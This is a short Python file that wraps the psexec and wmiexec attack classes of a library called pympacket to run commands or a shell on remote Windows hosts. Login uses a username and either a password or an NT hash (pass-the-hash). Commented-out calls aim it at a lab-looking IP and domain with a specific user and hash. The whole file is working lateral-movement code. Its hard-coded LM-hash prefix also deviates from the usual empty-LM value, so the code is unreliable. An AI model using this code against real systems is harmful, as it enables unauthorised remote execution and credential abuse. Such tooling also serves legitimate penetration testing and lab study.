from pympacket.attacks.psexec import PSEXEC
from pympacket.attacks.wmiexec import WMIEXEC

def psexec(target, username, domain, password='', nthash=None, cmd='cmd.exe'):
    if nthash is not None:
        nthash = f'aad3c435b514a4eeaad3b935b51304fe:{nthash}'

    ps_obj = PSEXEC(command=cmd, path=None, exeFile=None, copyFile=None, username=username, password=password, domain=domain, serviceName='', hashes=nthash)
    ps_obj.run(remoteName=target, remoteHost=target)

def wmiexec(target, username, domain, password='', nthash=None, cmd=' ', shell_type='cmd'):
    if nthash is not None:
        nthash = f'aad3c435b514a4eeaad3b935b51304fe:{nthash}'

    wmi_obj = WMIEXEC(command=cmd, username=username, password=password, domain=domain, hashes=nthash, share='ADMIN$', remoteHost=target, shell_type=shell_type)
    wmi_obj.run(addr=target, silentCommand=False)

#psexec(target='192.168.56.133', username='d.garza', nthash='5a642013439f0ab8721115d3a87068db', domain='contoso.local')
#wmiexec(target='192.168.56.133', username='d.garza', nthash='5a642013439f0ab8721115d3a87068db', domain='contoso.local')